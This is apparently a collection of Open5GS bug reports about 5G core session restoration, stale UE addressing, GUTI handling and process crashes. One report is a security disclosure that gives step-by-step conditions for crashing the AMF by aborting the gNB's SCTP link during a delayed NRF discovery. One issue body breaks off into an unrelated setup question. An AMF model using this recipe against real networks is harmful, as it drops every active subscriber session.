items.title: [Bug]: SMF PFCP restoration re-installs stale UE IPs after UPF restart (silent downlink black-hole)

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.8.1 (also observed on main `d6f1ed8`, 2026-10-19)

### Summary

After `docker restart upf` (i.e. UPF process restarts and loses its PFCP state), the SMF's PFCP
**restoration** re-installs the sessions **it holds in memory** — including the UE IPv4 address it
recorded at session creation. If the UE has meanwhile re-registered and received a **new IP**, the
restored downlink PDRs are keyed on the **old** IP, and every downlink packet for the UE's real IP
misses the PDR and is silently black-holed.

On a userspace datapath (eUPF) the effect is a silent drop with **no error log and no drop counter**:
the packet falls through to `XDP_PASS`, hits the kernel, and is discarded as a martian source
(source address does not match the outgoing interface).

### Steps to reproduce (5GC, single UPF, no MPAS)

1. Establish N PDU sessions for N UEs (we use 8 sessions / 4 UEs over a real NG interface:
   UERANSIM gNB+UE, eUPF as UPF, open5gs SMF/AMF/… on the same host).
2. `docker stop upf` → wait for heartbeat give-up → SMF releases all sessions (#4863 path) →
   `docker start upf`.
   *Alternatively* the mismatch also appears when the UE re-registers between the two events.
3. Let the UEs re-register (they get **new** IPs; in our run `10.64.0.2/.3` instead of `10.64.0.64/.65`).
4. Observe: the SMF's restoration re-creates the PFCP sessions, but with the **old** UE IPs.

### Observed behaviour

In the UPF's downlink PDR table (`pdr_map_downlink_ip4` in eUPF; the F-TEID/UE-IP → PDR map):
keys are `10.64.0.64`, `10.64.0.65`, while the UEs' actual tun addresses are `10.64.0.2`, `10.64.0.3`.

eUPF's REST API confirms it received the stale addresses:

```
SEID 4  PDR1 Ipv4 = 10.65.0.65   (while the UE's tun is 10.65.0.2)
```

Download traffic for the real IP then produces (measured, 20 pings from an IMS container):

```
rx_n6  +31     tx_n3  +0       XDP_PASS +46
```

i.e. **the packet never reaches the GTP encapsulation step** — it is passed to the kernel.
Contrast with a UE whose IP did match (same run, same UPF):

```
rx_n6  +38     tx_n3  +20      XDP_REDIRECT +20
```

The whole test took 2 minutes to confirm: a full cold start (`amf+smf → upf → gNB → UE`) makes the
two sides agree again (8 ↔ 8), and every path recovers (ICMP both ways, and `SIP OPTIONS` to the
P-CSCF returns `200 OK`).

### Expected behaviour

Restoration should not resurrect stale UE addressing. Two possible shapes:

1. **Validate on restore**: when re-installing a session, if the UPF-side session state is gone
   (which the SMF can tell from the new Recovery Time Stamp / the fact it is running `pfcp_restoration()`),
   don't blindly re-install the old F-TEID/UE-IP pairs — either refresh them from the current
   SM context or release the session so the UE re-establishes cleanly.
2. **Release instead of restore** when the UPF lost state: this is exactly the "release vs restore"
   decision discussed in #4860 / #4876. If the operator chooses `keep`, the restoration path still
   has to guarantee that the addressing it pushes matches what the UE currently uses.

### Why this matters beyond our rig

* This is the **user-visible failure mode** of the restore/release race in #4860: the control plane
  (and charging) believes the session is alive while the user plane silently drops **all** downlink
  traffic. There is no alarm surface for it.
* It only affects *some* UEs (the ones whose IP changed), so it looks like "random UEs are broken",
  which is very hard to triage — we initially mis-diagnosed it as a NIC/veth problem.
* With #4876 (`T_release_after_upf_failure`) landing, both branches (`release` and `keep`) need this
  invariant: **restoration must use the addressing that the UE actually has now**.

### Logs / evidence

Happy to attach: eUPF `pdr_map_downlink_ip4` dump (bpftool), the two XDP counter deltas above,
the eUPF restoration log line (`session UE 10.64.0.64 -> N3 endpoint …`), and the SMF window
showing the release + restoration. Full analysis and the local guard we added are in our repo;
can share on request.

### Our workaround

A consistency check between the UPF's session UE-IPs and the UEs' actual tunnel addresses, run after
any UPF restart (`session-ip-consistency.sh` in our tree), plus the rule "always do a full cold
start, never restart the UPF alone". Both are workarounds, not fixes.

items.body:
### Open5GS Release, Revision, or Tag

v2.8.1

### Steps to reproduce

This is the counterpart of ticket #4860 but applied to open5gs-upfd instead of open5gs-smfd.

Apparently open5gs-upfd is not currently deleting session when the SMF is considered in failure (due to eg. Heartbeat timeout).

How to reproduce: Create some sessions on the UPF, then eg. kill the open5gs-smfd process, let UPF send Heartbeats until t3_holding_duration triggers.

### Logs

```shell

```

### Expected behaviour

As per TS 23.527 V18.6.0 clause 4.4.3.1:
> the UPF shall delete all the session contexts affected by the peer PFCP entity failure that it may have stored.

### Observed Behaviour

No session is deleted then according to open5gs-upfd logs.

This is well described by @MrBrownieCGN in https://github.com/open5gs/open5gs/issues/4860#issuecomment-6202375701 point 5:

> 5. UPF side (re "this same issue also probably affects open5gs-upfd")
> 
> On main, when the UPF loses the heartbeat towards the SMF it only goes back to will_associate and keeps all
> sessions (src/upf/pfcp-sm.c:342-345); sessions of that SMF are removed only when the SMF comes back with a new
> Recovery Time Stamp (pfcp_restoration(), :371-386). Here the spec is not implementation specific. TS 23.527 V18.6.0,
> clause 4.4.3.1:
> 
> >    When a UPF detects that a peer PFCP entity in the SMF is not reachable for a preconfigured time, and the MPAS or SSET
> >    procedure specified for SMF set in clause 5.22 of 3GPP TS 29.244 [4]) are not used, the UPF shall delete all the
>>     session contexts affected by the peer PFCP entity failure that it may have stored.
> 
> The "preconfigured time" can reasonably be longer than the heartbeat give-up, but some bound seems to be required.
> 

### eNodeB/gNodeB

_No response_

_No response_

items.body:
### Open5GS Release, Revision, or Tag

v2.8.0 (master)

### Steps to reproduce

TTCN-3 test SMF_Tests.TC_pfcp_heartbeat_timeout from osmo-ttcn3-hacks.git showcases the scenario:
https://gerrit.osmocom.org/c/osmo-ttcn3-hacks/+/43873

### Logs

```shell
10/12 11:54:40.821: [pfcp] DEBUG: [2] LOCAL  Response Timeout for step 1 type 1 peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:623)
10/12 11:54:40.821: [pfcp] WARNING: [2] LOCAL  No Reponse. Give up! for step 1 type 1 peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:642)
10/12 11:54:40.821: [pfcp] DEBUG: [2] LOCAL  Delete  peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:836)
10/12 11:54:40.821: [smf] DEBUG: smf_state_operational(): SMF_EVT_N4_NO_HEARTBEAT (../../../../../dev/sysmocom/git/open5gs/src/smf/smf-sm.c:94)
10/12 11:54:40.821: [smf] DEBUG: smf_pfcp_state_associated(): SMF_EVT_N4_NO_HEARTBEAT (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:182)
10/12 11:54:40.821: [smf] WARNING: No Heartbeat from UPF [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:426)
10/12 11:54:40.821: [smf] ERROR: No UPF available (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:528)
10/12 11:54:40.821: [smf] DEBUG: smf_pfcp_state_associated(): EXIT (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:182)
10/12 11:54:40.821: [smf] INFO: PFCP de-associated [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:205)
10/12 11:54:40.821: [smf] DEBUG: smf_pfcp_state_will_associate(): ENTRY (../../../../../dev/sysmocom/git/open5gs/src/smf/pfcp-sm.c:74)
10/12 11:54:40.821: [pfcp] DEBUG: [4] LOCAL  Create  peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:131)
10/12 11:54:40.821: [pfcp] DEBUG: Association Setup Request (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/build.c:87)
10/12 11:54:40.821: [pfcp] DEBUG: [4] LOCAL  UPD TX-5  peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:231)
10/12 11:54:40.821: [pfcp] DEBUG: [4] LOCAL  Commit  peer [127.0.0.7]:8805 (../../../../../dev/sysmocom/git/open5gs/lib/pfcp/xact.c:500)
```

### Expected behaviour

As of current main  (d5d735c67356ff4cb2d86be6effadcc351b5b7b5), open5gs-smfd doesn't release UE sessions after the only UPF available is considered to be unavailable after obtaining no answer for a while (eg. multiple Heartbeat Requests not answered).

With current implementation, open5gs-smfd will keep trying forever until the UPF is available again and it sends a newer (bigger) Recovery timestamp which starts restoration value. 

The problem with that is that it may take a long time, or even "forever", for the UPF to become available again, and during that potentially long time the Control Plane assumes the user plane is working just fine, because the sessions are still active, which is false. This means for instance time accounting may go on on the OCS, etc.

Instead, when a Heartbeat timeout happens (configurable by the user, eg. 60 seconds) and the UPF is considered unavailable, it should release all the sessions on the core network so that the subscriber can see it has no PDU session instead of simply seeing no traffic passing through.

What do the specs say about this scenario? Well, they basically say it's "implementation specific".

3GPP TS 29.244 5.8.2 Behaviour with an Established PFCP Association
> When a PFCP Association is established with a UP function, the CP function:
> ...
> - shall check the responsiveness of the UP function using the Heartbeat procedure as specified in clause 6.2.2;

3GPP TS 23.527 4.2 N4 Failure and Restart Detection:
> Across PFCP based interfaces, an SMF and UPF shall utilize the PFCP Heartbeat Request and Heartbeat Response
> messages to detect a peer PFCP entity failure or restart as described in clause 19A of 3GPP TS 23.007

3GPP TS 23.527 4.5 N4 path failure:
> If the N4 path to the UPF is down, the SMF should handle this as an UPF Failure without Restart, see clause 4.3.3.

4.3.3 Restoration Procedure for PSA UPF Failure without Restart
> Procedures for PSA UPF failure without restart are implementation specific.

### Observed Behaviour

See "Expected behaviour" section.

### eNodeB/gNodeB

TTCN-3

### UE Models and versions

_No response_

items.title: [Bug]: SMF aborts on PFCP Session Deletion timeout when the associated SBI stream is gone (sess_5gc_timeout: Assertion 'stream' failed)
items.body:
### Summary

When a PFCP Session Deletion Request times out (`No PFCP session deletion response`) and the associated SBI stream has already been released, `sess_5gc_timeout()` in `src/smf/pfcp-path.c` hits `ogs_assert(stream)` and **aborts the whole SMF process**. On restart the SMF loses all in-memory UE address allocations, which leads to duplicate UE IP assignment and broken downlink for roughly half of the (re)attached sessions. Under session churn (mass UE attach/detach) this can become a self-feeding crash loop (crash → reconciliation → more deletion timeouts → crash again).

This is the sibling of #2085 (which fixed the same pattern for the **modification** timeout path); the **deletion** path was left unguarded.

### Environment

- open5gs commit `f87da618b5896f57c3a2bacc7e011974403c4d28` — still present on `main` as of 2026-10-03
- N4 peer: eUPF (edgecomllc/eupf), ~600–1100 simulated UEs on the same host
- Lab rig with heavy session churn; open5gs SMF restarted 4–6 times within one afternoon, every restart triggered by this assert

### Evidence

```
[pfcp] WARNING: [1289] LOCAL No Reponse. Give up! for step 1 type 54 peer [172.22.0.8]:8805 (../lib/pfcp/xact.c:640)
[smf]  ERROR: [imsi-001010000082236:2] No PFCP session deletion response[7] (../src/smf/pfcp-path.c:330)
[smf]  FATAL: sess_5gc_timeout: Assertion `stream' failed. (../src/smf/pfcp-path.c:341)
[core] FATAL: backtrace() returned 8 addresses (../lib/core/ogs-abort.c:37)
./open5gs-smfd(+0x4f730) ...
```

### Root cause

`src/smf/pfcp-path.c`, `sess_5gc_timeout()`:

```c
} else if (trigger == OGS_PFCP_DELETE_TRIGGER_UE_REQUESTED ||
        trigger == OGS_PFCP_DELETE_TRIGGER_AMF_UPDATE_SM_CONTEXT ||
        trigger == OGS_PFCP_DELETE_TRIGGER_AMF_RELEASE_SM_CONTEXT) {

    ogs_assert(stream);               /* <-- stream may be NULL */
    ogs_assert(true ==
        ogs_sbi_server_send_error(stream,
            OGS_SBI_HTTP_STATUS_GATEWAY_TIMEOUT, NULL, strerror,
            NULL, NULL));
}
```

`stream` comes from `ogs_sbi_stream_find_by_id(xact->assoc_stream_id)`. If the AMF-side SBI stream was released while the PFCP transaction was still pending (AMF gave up / UE context cleaned up during churn), the lookup returns NULL and the assert aborts the process. The modification branch a few lines above already guards with `if (stream)`, so this looks like an oversight rather than intentional behavior.

### Suggested fix

Handle the NULL stream gracefully — report 504 only when the stream is still alive, otherwise log and continue with the existing `SMF_EVT_N4_TIMER` cleanup below:

```c
if (stream) {
    ogs_assert(true ==
        ogs_sbi_server_send_error(stream,
            OGS_SBI_HTTP_STATUS_GATEWAY_TIMEOUT, NULL, strerror,
            NULL, NULL));
} else {
    ogs_warn("No SBI stream for PFCP deletion timeout [%d]", trigger);
}
```

### Verification of the fix

We applied exactly this change to our local build and re-ran the scenario: full stack reset + a one-shot 600-UE attach/detach churn plus mass UE kills. **SMF restart count stayed 0 through the whole run** (previously 4–6 crashes per run), with clean 1:1 UE IP allocation. A PR can be provided if helpful.

### Notes

- The timeout itself can also be triggered by a UPF not answering some deletions; that part is being reported separately to eUPF (edgecomllc/eupf). Regardless of peer behavior, the SMF should not abort on this path.

items.title: [Bug]: AMF treats the GUTI allocated in the initial Registration Accept as unknown and requests SUCI after reconnection
items.body:
Hi Open5GS team,

According to [[TS 24.501 V19.8.0 §5.5.1.2.8(g)](https://www.etsi.org/deliver/etsi_ts/124500_124599/124501/19.08.00_60/ts_124501v190800p.pdf#page=413)](https://www.etsi.org/deliver/etsi_ts/124500_124599/124501/19.08.00_60/ts_124501v190800p.pdf#page=413), when the AMF receives a mobility registration update while awaiting Registration Complete, it shall consider the GUTI allocated during initial registration valid and proceed with the registration update. In these experiments, even when the request carries SUCI and resolves to the existing UE context, the AMF directly restarts authentication through the branch that handles requests while awaiting Complete, leaving the allocated GUTI pending confirmation. This violates the requirement to consider that GUTI valid.

After initial registration reaches Registration Accept, the UE has received the GUTI allocated by the AMF. With Registration Complete deferred, a subsequent mobility Registration Request using this GUTI produces an `Unknown UE` lookup result. Following connection release and reconnection, the AMF creates a second UE context and sends an Identity Request asking for SUCI.

With the same preceding sequence, an update request explicitly carrying SUCI resolves to the original UE context. The following four experiments compare the identity type and connection handling.

## Environment

- seqTest VM running Ubuntu 20.04.6 LTS.
- Open5GS commit used in the experiments: `51ee7ca07abd9db7a56e2b0608f5406a1dfab057`.
- Official `main` source reviewed on October 31, 2026: `b60aad44e71b3f62c93440992a8b18cb67953c87`.
- Instrumented UERANSIM based on test revision `729c0ac`. A dedicated test switch bypasses the adapter’s automatic conversion of ordinary registration requests to GUTI-based requests, allowing the SUCI cases to use the original registration sending path.
- Test PLMN: 999/70. UE: `imsi-999700000000002`. Security algorithms: NEA0/NIA2. Native ngKSI: 0.
- Each case starts with fresh core-network and UE contexts. Captured evidence includes complete uplink NAS messages, downlink messages before tester filtering, and AMF logs.

## Steps to reproduce

Execute the following common sequence:

```text
registrationRequest
authenticationResponse
securityModeComplete
```

The corresponding responses are Authentication Request, Security Mode Command, and Registration Accept. Let G0 denote the GUTI allocated in that Accept. Defer Registration Complete.

Approximately one second after receiving Accept, execute one of these four cases:

1. **GUTI, existing connection:** Execute `registrationRequestGUTI` over the existing UE-associated NG connection.
2. **GUTI, release and reconnect:** Complete connection release through an NG-RAN-initiated UE Context Release Request, then execute `registrationRequestGUTI` through a new InitialUEMessage.
3. **SUCI, existing connection:** Execute `registrationRequest` using the SUCI template over the existing connection.
4. **SUCI, release and reconnect:** Complete the same connection release, then execute `registrationRequest` using the SUCI template.

The fourth request has registration type 2, mobility registration updating, in all four cases. Both GUTI cases carry G0 from their respective Registration Accept.

Requests over the existing connection use SHT 2; requests after reconnection use SHT 1. Their security protection is generated using the established NAS security context. Observe each case for eight seconds after the fourth request.

## Actual results

- **GUTI, existing connection:** The lookup for G0 reports `Unknown UE`. The AMF uses the existing NG association to enter authentication and sends Authentication Request.
- **GUTI, release and reconnect:** Both the NGAP S-TMSI lookup and the NAS GUTI lookup report `Unknown UE`. The AMF UE count increases from 1 to 2, and the AMF sends Identity Request asking for SUCI.
- **SUCI, existing connection:** The AMF logs `known UE by SUCI` and sends Authentication Request using the original UE context.
- **SUCI, release and reconnect:** The NGAP S-TMSI lookup reports `Unknown UE`. The NAS SUCI lookup resolves to the original UE context, and the AMF sends Authentication Request. The AMF UE count remains 1.

In the GUTI release-and-reconnect case, the complete mobile identity is `F299F907020040C00000B3`. This value appears in both Registration Accept and the subsequent Registration Request. The AMF logs:

```text
UE Context Release [Action:2]
Unknown UE by 5G-S_TMSI[AMF_ID:0x20040,M_TMSI:0xc00000b3]
Unknown UE by 5G-S_TMSI[AMF_ID:0x20040,M_TMSI:0xc00000b3]
[Added] Number of AMF-UEs is now 2
```

The subsequent downlink NAS message is `7E005B01`, an Identity Request asking for SUCI.

## Specification and expected behavior

Open5GS declares support for Release 19. [[TS 24.501 V19.8.0 §5.5.1.2.8(g), printed page 412 / PDF page 413](https://www.etsi.org/deliver/etsi_ts/124500_124599/124501/19.08.00_60/ts_124501v190800p.pdf#page=413)](https://www.etsi.org/deliver/etsi_ts/124500_124599/124501/19.08.00_60/ts_124501v190800p.pdf#page=413) requires the AMF, upon receiving a mobility or periodic Registration Request while awaiting the expected Registration Complete, to:

- Stop T3550.
- Consider the GUTI allocated during initial registration valid.
- Proceed with mobility or periodic registration updating according to §5.5.1.3.

Case (a) of the same clause also specifies that a lower-layer failure while awaiting Complete with T3550 running requires the AMF to abort initial registration locally, enter 5GMM-REGISTERED, and consider both the old and new GUTIs allocated by this AMF valid until the specified invalidation conditions apply.

G0 should resolve to the existing UE context. Its validity should support the registration update and subsequent connection recovery. Authentication may be performed as a common procedure during the registration update.

I'm trying to setup Open5GS v2.5.8 with UERANSIM v3.2.6 on Kubernetes. However, the UERANSIM UE is not able to register successfuly. It seems that the AMF is not able to discover the SMF. Bellow AMF, SCP, and NRF logs and configs.

AMF:

items.body:
I have a question relating to apply a new configuration inside the Open5GS. When we need to make some changes inside the Open5GS core (for example in the upf.yaml), we need to restart the service, or the script to apply the new configuration. 

Is there any way to apply the new changes without restart the services or the scripts ? The problem is that, if we want to apply a new configuration, for example add a new APN, and we restart the service, all the connected users will lose the connectivity for some seconds. The idea is, for example create a new APN, without impacting the existing sessions.

items.title: [Bug]: AMF DoS via unchecked NULL RAN-UE context in amf_nnrf_handle_nf_discover() during delayed NRF Discovery response

labels.name: Type:Security
labels.description: Security issue

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

items.body:
### Open5GS Release, Revision, or Tag

v2.7.7

### Steps to reproduce

### Description

AMF crashes in `amf_nnrf_handle_nf_discover()` when a delayed NRF Discovery response arrives after the associated RAN-UE context has already been removed.

The affected path resolves the stored `ran_ue_id` with `ran_ue_find_by_id()` and immediately asserts the result with `ogs_assert(ran_ue)`. If the RAN-UE context no longer exists, `ran_ue_find_by_id()` returns NULL and the assertion terminates the AMF process.

The v2.7.7 release includes several AMF/SBI race-condition fixes, including PR #4081, #4178, and #4346. However, this specific NRF Discovery callback path still lacks the corresponding NULL check after `ran_ue_find_by_id()`.

A related guarded timer-expiry path in `src/amf/amf-sm.c` already handles this case:

```c
// src/amf/amf-sm.c - related guarded timer-expiry path
if (ran_ue_id < OGS_MIN_POOL_ID || ran_ue_id > OGS_MAX_POOL_ID) {
    ogs_error("No assoc RAN-UE id [%d]", ran_ue_id);
    break;
}
ran_ue = ran_ue_find_by_id(ran_ue_id);
if (!ran_ue) {
    ogs_error("[%s:%s:%d:%d] "
            "NG Context has already been removed",
            amf_ue->supi, amf_ue->suci, sess->psi, sess->pti);
    break;
}
```

By contrast, the NRF Discovery callback path reaches `ogs_assert(ran_ue)` without equivalent NULL handling:

```c
// src/amf/nnrf-handler.c:88-89
ran_ue = ran_ue_find_by_id(ran_ue_id);
ogs_assert(ran_ue);   // NULL -> ogs_abort() -> AMF crash
```

### Conditions observed in the controlled reproduction

The crash was reliably reproduced when the following conditions coincided:

1. SMF absent from AMF's NF instance cache
   - For example, after SMF crash, restart, or deregistration.

2. NRF Discovery response delayed
   - For example, due to network delay, NRF overload, or controlled delayed response in a lab environment.

3. gNB N2 connection terminated during the discovery window
   - For example, SCTP association shutdown/abort, gNB restart, NG Reset, or UE context release.
   - RLF may indirectly lead to UE context release depending on implementation, but RLF itself is not an SCTP shutdown mechanism.

4. SCP discovery disabled or unavailable
   - When SCP is reachable, discovery may route via `client_discover_cb`, which already contains NULL handling for a removed RAN-UE context.
   - This condition is realistic for lab, research, or minimal deployments where the SCP process is not deployed, disabled, or unavailable.

> Note: Open5GS v2.7.7's packaged default `amf.yaml` includes an active SCP client URI (`http://127.0.0.200:7777`), while the direct NRF client URI is commented out. The crash was reproduced in a lab configuration where the NRF Discovery response reached `amf_nnrf_handle_nf_discover()`.

### Lab reproduction sequence

1. Existing lab gNB connects to AMF N2 over SCTP port 38412.

2. UE attaches and requests a PDU Session.

3. SMF is absent from the AMF NF instance cache.

4. AMF sends an asynchronous NRF Discovery request through the NSSF-assisted discovery path.

5. During the discovery window, the lab gNB process is terminated.

6. AMF handles the N2 termination and removes the associated RAN-UE context.

7. The delayed NRF Discovery response arrives.

8. `amf_nnrf_handle_nf_discover()` is invoked.

9. `ran_ue_find_by_id(ran_ue_id)` returns NULL.

10. `ogs_assert(ran_ue)` fails and AMF terminates via `ogs_abort()`.

Primary reproduction result:

- Scapy SCTP ABORT method: 5/5 successful reproductions under controlled lab conditions.
- Additional validation: graceful SCTP shutdown via lab gNB SIGTERM reproduced the same AMF crash condition.

### Suggested fix

Apply a defensive NULL-check pattern consistent with existing guarded paths. The following is an illustrative defensive pattern; maintainers may adapt the cleanup path to the existing SBI transaction lifecycle:

```c
// src/amf/nnrf-handler.c - suggested defensive pattern
// BEFORE:
ogs_assert(ran_ue_id >= OGS_MIN_POOL_ID && ran_ue_id <= OGS_MAX_POOL_ID);
ran_ue = ran_ue_find_by_id(ran_ue_id);
ogs_assert(ran_ue);

// AFTER:
if (ran_ue_id < OGS_MIN_POOL_ID || ran_ue_id > OGS_MAX_POOL_ID) {
    ogs_error("No assoc RAN-UE id [%d]", ran_ue_id);
    ogs_sbi_xact_remove(xact);
    return;
}

ran_ue = ran_ue_find_by_id(ran_ue_id);
if (!ran_ue) {
    ogs_error("NG Context has already been removed");
    ogs_sbi_xact_remove(xact);
    return;
}
```

Additional recommendations:

- Cancel in-flight NRF Discovery transactions when `ran_ue_remove()` is called.
- Audit all `amf_sess_sbi_discover_and_send()` call sites in `ngap-handler.c` for the same race pattern.

### Relevant code paths

- Vulnerable path: https://github.com/open5gs/open5gs/blob/v2.7.7/src/amf/nnrf-handler.c#L88-L89
- RAN-UE ID snapshot: https://github.com/open5gs/open5gs/blob/v2.7.7/src/amf/sbi-path.c#L220-L229
- Existing guarded timer path: https://github.com/open5gs/open5gs/blob/v2.7.7/src/amf/amf-sm.c#L888-L900
- Existing guarded SCP callback path: https://github.com/open5gs/open5gs/blob/v2.7.7/src/amf/sbi-path.c#L322-L370

### Logs

```shell
Combined lab timeline (2026-05-03 UTC):

The timeline combines AMF logs and lab-control events recorded during reproduction.

15:43:12.560  NF_DEREGISTERED [type:SMF] - SMF removed from NF cache
15:43:22.205  Number of AMF-Sessions is now 1 - PDU Session created
15:43:22.206  No V-SMF Instance - NSSF fallback triggered
15:43:22.206  Try to discover [nnssf-nsselection] - NRF Discovery sent
15:43:22.986  SIGTERM sent to lab nr-gnb - SCTP graceful shutdown - ran_ue freed
15:43:28.651  FATAL: Assertion `ran_ue' failed. (nnrf-handler.c:89)

Crash log:

05/03 15:43:28.651: [amf] FATAL: amf_nnrf_handle_nf_discover:
    Assertion `ran_ue' failed. (../src/amf/nnrf-handler.c:89)

05/03 15:43:28.652: [core] FATAL: backtrace() returned 8 addresses
    (../lib/core/ogs-abort.c:37)

Primary reproduction — Scapy SCTP ABORT method (2026-05-03), 5/5:

Trial 1: PID 1048776 -> 1050641 | FATAL=2
Trial 2: PID 1051542 -> 1053085 | FATAL=2
Trial 3: PID 1053974 -> 1055504 | FATAL=2
Trial 4: PID 1056406 -> 1057950 | FATAL=2
Trial 5: PID 1059542 -> 1060673 | FATAL=2

Additional validation — graceful SCTP shutdown via lab gNB SIGTERM:

PID 963525 -> 964728 | FATAL=2 | Crash time: 2026-05-03 15:43:28.651 UTC
```

### Expected behaviour

AMF should handle the case where `ran_ue_find_by_id()` returns NULL gracefully.

Expected behavior:

- Log an error indicating that the associated RAN-UE context has already been removed.
- Clean up or remove the corresponding SBI transaction as appropriate.
- Return from the NRF Discovery callback without aborting the AMF process.
- Continue serving other active UE sessions.

This behavior would be consistent with existing guarded paths, such as the timer-expiry path in `src/amf/amf-sm.c`, where a missing RAN-UE context is handled without terminating AMF.

### Observed Behaviour

The AMF process terminates immediately when the delayed NRF Discovery response is processed after the associated RAN-UE context has already been removed.

Observed behavior:

- `amf_nnrf_handle_nf_discover()` receives the delayed NRF Discovery response.
- The stored `ran_ue_id` no longer resolves to a valid RAN-UE context.
- `ran_ue_find_by_id(ran_ue_id)` returns NULL.
- `ogs_assert(ran_ue)` fails.
- AMF terminates via `ogs_abort()`.
- All active UE sessions are dropped until AMF restarts.

Reproduction results:

- Scapy SCTP ABORT method: 5/5 successful reproductions under controlled lab conditions.
- Additional validation: graceful SCTP shutdown via lab gNB SIGTERM reproduced the same AMF crash condition.

Observed crash:

```
05/03 15:43:28.651: [amf] FATAL: amf_nnrf_handle_nf_discover:
    Assertion `ran_ue' failed. (../src/amf/nnrf-handler.c:89)
```

### eNodeB/gNodeB

UERANSIM v3.2.8

### UE Models and versions

UERANSIM v3.2.8

items.title: AMF/SMF stale UE context after gNB SCTP reconnection causes PDU session failure (HTTP 400)

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

labels.name: not-an-open5gs-bug
labels.description: This is not a bug in open5gs

items.body:
**Description**

When a gNB disconnects and reconnects (e.g. during cell reconfiguration that requires lock/unlock), some UEs — particularly iPhone 17 Pro Max — end up in a state where they are registered but have no data connectivity. The SMF logs show repeated HTTP response error [400] when attempting N1N2 message transfer.

  **Environment**
  - Open5GS v2.7.6 on Ubuntu 22.04
  - Commercial 5G SA gNB (NR TDD, n77)
  - UE: iPhone 17 Pro Max with dual SIM (private 5G eSIM + commercial SIM)
  - iPhone 14 on the same cell does not exhibit this issue

  **Steps to Reproduce**
  1. gNB connected to Open5GS AMF via SCTP, UEs attached with active PDU sessions
  2. gNB performs cell reconfiguration (internally does lock/unlock, dropping SCTP association)
  3. SCTP association re-establishes, gNB sends NG Setup Request, AMF accepts
  4. iPhone re-registers (Registration complete logged in AMF)
  5. iPhone requests PDU session — SMF creates session and assigns IP
  6. SMF sends N1N2 message transfer to AMF — gets HTTP 400
  7. Session removed, iPhone retries every ~16 seconds, same failure
  8. iPhone shows "attached" but has no data connectivity

  **AMF/SMF Log**
```
  [gmm] INFO: [imsi-xxxx] Registration complete
  [gmm] INFO: UE SUPI[imsi-xxxx] DNN[internet] S_NSSAI[SST:1 SD:0xffffff] smContextRef[NULL]
  [smf] ERROR: [imsi-xxxx:1] HTTP response error [400]
  [amf] ERROR: No UE context [imsi-xxxx]
  [amf] ERROR: No RAN UE Context : AMF_UE_NGAP_ID[64]
```
  **Expected Behaviour**
When the SCTP association drops, the AMF should fully clean up all UE contexts (AMF-UE, RAN-UE, and associated SMF sessions). When the gNB reconnects and UEs re-register, they should get a completely fresh context with working PDU sessions.

  **Workaround**
Restarting open5gs-amfd and open5gs-smfd after the gNB reconnects clears the stale state and UEs connect successfully on the next attempt.

  **Additional Notes**
  - The issue is more pronounced with iPhone 17 Pro Max than iPhone 14
  - The gNB's SCTP disconnect/reconnect happens within seconds
  - UPF data path is confirmed working (ping from UPF to UE IP succeeds) but zero packets appear on ogstun from the affected UE

items.title: [Bug]: Static IPv4 assigned to Subscriber A can be dynamically allocated to Subscriber B after profile modification

labels.name: Housekeeping:ToClose
labels.description: Issues reviewed and closed. Old requests, issues which are not bug, feature or documentation request

labels.name: not-an-open5gs-bug
labels.description: This is not a bug in open5gs

items.body:
### Open5GS Release, Revision, or Tag

v2.7.6

### Steps to reproduce

The issue was observed while using static IPv4 assignments.

The following sequence appears to reproduce the problem:

1. Subscriber A is configured with a static IPv4 address.
   Example:
       IMSI: 999990000000002
       UE IPv4 Address: 100.80.1.2

2. Subscriber B is not using static IP.

3. Subscriber B establishes a new PDU Session.

4. SMF allocates the IPv4 address that is statically configured for Subscriber A
   (100.80.0.2), even though Subscriber A still owns that address in its subscriber profile.

5. Later, Subscriber A loses connectivity.

6. Subscriber A no longer sends new Registration/PDU Session procedures successfully until either:
   - the UE is rebooted, or
   - the Open5GS core services are restarted.

The problem was confirmed by checking SMF logs using the duplicated IPv4 address rather than the IMSI.


### Logs

```shell
07/08 07:03:37.779: [ausf] INFO: [imsi-999990000000003] AUSF-UE removed (../src/ausf/ausf-sm.c:378)
07/08 07:03:37.776: [smf] INFO: Removed Session: UE IMSI:[imsi-999990000000003] DNN:[test:6] IPv4:[100.80.1.2] IPv6:[2001:db8:cafe:200::201] (../src/smf/context.c:1789)
07/08 07:04:07.668: [smf] INFO: UE SUPI[imsi-999990000000003] DNN[test] IPv4[100.80.1.3] IPv6[2001:db8:cafe:2a9::2aa] (../src/smf/npcf-handler.c:590)
```

### Expected behaviour

A statically assigned IPv4 address must never be allocated dynamically to another subscriber.

The IPv4 allocator should exclude all statically assigned addresses from the dynamic allocation pool, regardless of whether another subscriber has recently been modified.

At no point should two different subscribers be able to obtain the same IPv4 address.

At the smf.yaml and upf.yaml files, its possible to configure the subnet address, but is not possible to define the dynamic address pool.


### Observed Behaviour

SMF dynamically allocated an IPv4 address that was statically assigned to another subscriber.

After this happened:

- Subscriber A lost connectivity.
- Subscriber A no longer generated successful registration/PDU session procedures.
- Restarting the gNB did not solve the issue.
- Rebooting the UE restored connectivity.
- Restarting the Open5GS core also restored connectivity.

Additionally, the subscriber's PDU session was still visible through the Open5GS PDU session API, while no corresponding database session existed.

### eNodeB/gNodeB

Zary 

### UE Models and versions

Huawei 153-381

